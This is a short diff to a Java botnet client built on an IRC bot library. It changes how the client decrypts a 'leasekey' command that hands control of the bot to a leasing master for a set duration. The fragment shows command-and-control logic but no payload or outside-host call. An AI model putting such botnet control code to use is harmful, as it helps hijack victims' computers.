@@ -288,11 +288,11 @@ public class BotnetClient extends PircBot {
 							chat.close();
 						} else if (m.decryptMsgNonce(command).startsWith("leasekey")) {
 							String leaseMaster = m.decryptMsgNonce(chat.readLine());
-							long duration = Long.parseLong(m.decryptMsgNonce(chat.readLine()));
+							long duration = Long.parseLong(m.decryptMsg(chat.readLine()));
 							System.out.println("duration: " + duration);
 							String unenc = chat.readLine();
 							System.out.println("encrypted leasedPublicInfo: " + unenc);
-							String leasedPublicInfo = m.decryptMsgNonce(unenc);
+							String leasedPublicInfo = m.decryptMsg(unenc);
 							System.out.println("info " + leasedPublicInfo);
 							leaseTerminateTime = System.currentTimeMillis() + duration;
 							leased = true;
